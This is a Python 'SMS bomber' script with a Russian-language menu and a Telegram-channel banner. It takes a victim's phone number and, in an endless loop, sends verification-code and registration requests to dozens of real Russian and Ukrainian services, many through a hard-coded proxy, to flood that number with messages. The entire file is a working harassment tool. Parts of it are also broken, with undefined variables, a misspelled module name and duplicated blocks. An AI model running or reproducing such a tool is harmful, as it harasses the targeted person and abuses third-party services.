import webbrowser
import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style

#################################
#		Coded by @fleeen		#
#################################

banner = """
Мы в телеграме: @pyhax
╔==================================================================================================╗
░██████╗██╗░░░██╗██╗░█████╗░██╗██████╗░███████╗  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔════╝██║░░░██║██║██╔══██╗██║██╔══██╗██╔════╝  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
╚█████╗░██║░░░██║██║██║░░╚═╝██║██║░░██║█████╗░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
░╚═══██╗██║░░░██║██║██║░░██╗██║██║░░██║██╔══╝░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╔╝╚██████╔╝██║╚█████╔╝██║██████╔╝███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░░╚═════╝░╚═╝░╚════╝░╚═╝╚═════╝░╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
╚========================================Кодер: @fleeen============================================╝
╚======================================Мой канал: @pyhax===========================================╝
╚==================================================================================================╝
"""
def spam(_phone):
	if _phone[0] == '+':
	    _phone = _phone[1:]
	if _phone[0] == '8':
	    _phone = '7'+_phone[1:]
	if _phone[0] == '9':
	    _phone = '7'+_phone

	_name = ''
	for x in range(12):
	    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	iteration = 0
	sms_amount = 0
	_phone9 = _phone[1:]
	_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
	_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
	_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
	_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	request_timeout = 0.00001

	iteration = 0
	while True:

	#######################################################################################################################################################################################################################################
	#11.04.2020 9 Сервисов
	#######################################################################################################################################################################################################################################
	    try:
	    	a=requests.get('https://driver.gett.ru/signup/')
	    	requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru (http://driver.gett.ru/)','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':a.cookies['csrftoken']})
	    	print('[+] Driver.gett отправлено!')
	    	time.sleep(0.1)
	    	sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1
	 
	    try:
	        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {"phone":phone}, headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru (http://api.ivi.ru/)', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile (https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile)'})
	        print('[+] IVI отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        b = requests.session()
	        b.get('https://drugvokrug.ru/siteActions/processSms.htm')
	        requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru (http://drugvokrug.ru/)','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (https://drugvokrug.ru/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
	        print('[+] Drugvokrug отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
	        print('[+] RuTaxi отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
	        print('[+] Rutube отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone[1:],'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
	        print('[+] Psbank отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	    	requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
	    	print('[+] Beltelecom отправлено!')
	    	time.sleep(0.1)
	    	sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':phone[1:],'Package':'optimal'})
	        print('[+] Modulbank отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1
	#######################################################################################################################################################################################################################################
	    try:
	        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
	        print('[+] Gotinder отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
	        print('[+] IcQ отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + phone})
	        print('[+] YaEda отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1
	    try:
	        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
	        print('[+] Grab отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone})
	        print('[+] Prime отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
	        print('[+] Yandex.Chef')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')
	        
	    try:
	        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _name})
	        print('[+] EasyPAY отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/', data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone})
	        print('[+] Yaposhka отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
	        print('[+] finam отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone})
	        print('[+] Uklon отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Uklon не отправлено!')

	    try:
	        requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone})
	        print('[+] Uklon отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Uklon не отправлено!')

	    try:
	        requests.get('https://findclone.ru/register', params={"phone": "+" + _phone})
	        print('[+] FindClone отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1
	        
	    try:
	        requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
	        print('[+] Fix-Price отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requets.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": _phone}})
	        print('[+] GURU отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
	        print('[+] SportMaster!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": name,"application": "lkp","login": "+" +_phone})
	        print('[+] Invitro отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1
	        
	    try:
	        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
	        print('[+] Iqos отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://app.karusel.ru/api/v1/phone/', data={"phone": _phone})
	        print('[+] Karusel отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + _phone})
	        print('[+] Lenta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={"phone": _phone, "do": "phone"})
	        print('[+] Menu отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html', data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,})
	        print('[+] Menu2 отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://mobileplanet.ua/register', data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email})
	        print('[+] mobileplanet отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://www.moyo.ua/identity/registration', data={"firstname": name,"phone": _phone,"email": email})
	        print('[+] MOYO отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1
	       
	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={"st.r.phone": "+" +_phone})
	        print('[+] OK отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://www.ollis.ru/gql', json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone})
	        print('[+] Oliis отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
	        print('[+] Online.ua отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requets.post('https://plink.tech/resend_activation_token/?via=call', json={"phone": _phone})
	        print('[+] Plink отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://app.redmondeda.ru/api/v1/app/sendverificationcode', headers={"token": "."}, data={"phone": _phone})
	        print('[+] REDmondeta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://pay.visa.ru/api/Auth/code/request', json={"phoneNumber": "+" +_phone})
	        print('[+] Visa отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone":_phone})
	        print('[+] iconjob отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	       print('[-] error in sent!')
	       sms_amount -= 1

	    try:
	        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
	        print('[+] RuTaxi sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] BelkaCar sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] StarPizzaCafe отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://mamamia.ua/api/auth/login', data={"phone": _phone})
	        print('[+] MamaMia отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +_phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Sushiwok отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Tinder sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Karusel sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Tinkoff отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Dostavista отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] SportMaster отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://alfalife.cc/auth.php', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Alfalife отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] KoronaPay отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"_phone","nextStep":"auth-otp","__typename":"FlowResponse"}}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Silpo отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] BTfair отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] GGbet отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-]  не отправлено!')

	    try:
	        requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] ETM отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] TheLive отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MTS sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] error in sent!')
	        sms_amount -= 1

	    try:
	        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MyGames sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[+] error in sent!')

	    try:
	        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MyGames sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[+] error in sent!')

	    try:
	        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MyGames sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[+] error in sent!')

	    try:
	        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MyGames sent!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[+] error in sent!')

	    try:
	        requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Zoloto585 отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Kasta отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Kasta Не отправлено!')

	    try:
	        requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Taxi-Ritm отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Mail.ru отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Creditter отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Ingos отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Admiralxxx отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MTS отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] City24 отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] SushiMaster отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] MultiPlex отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] 3040 отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] не отправлено!')

	    try:
	        requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] Niyama отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] Niyama не отправлено!')

	    try:
	        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
	        print('[+] VSK отправлено!')
	        time.sleep(0.1)
	        sms_amount += 1
	    except:
	        print('[-] VSK не отправлено!')
def cls():
	os.system('cls')
	print(banner)

def info():
	cls()
	print('\nКодер(telegram): @fleeen\nМой канал в телеграме: @pyhax\n\nСервисы:\nРоссия: 50\nУкраина: 30\n')
	qn = input('[1] - Я в телеграме\n[2] - Мой канал\n[0] - Назад\n\nSCBMB -> ')
	if qn == '1':
		webbrowser.open('https://tlgg.ru/fleeen')
	elif qn == '2':
		webbrowser.open('https://tlgg.ru/pyhax')
	elif qn == '0':
		start()

def start():
	if __name__ == '__main__':
		cls()
		start = print('\nВыберете действие:\n[1] - Начать спам\n[2] - Информация\n[3] - Выйти')
		q = input('SCBMB -> ') 
		if q == '1':
			cls()
			_phone = input('Введите номер(79xxxxxxxxx или 380xxxxxxxxx)\nSCBMB -> ')
			spam(_phone)
		elif q == '2':
			info()
		elif q == '3':
			exit()

print(banner)
start()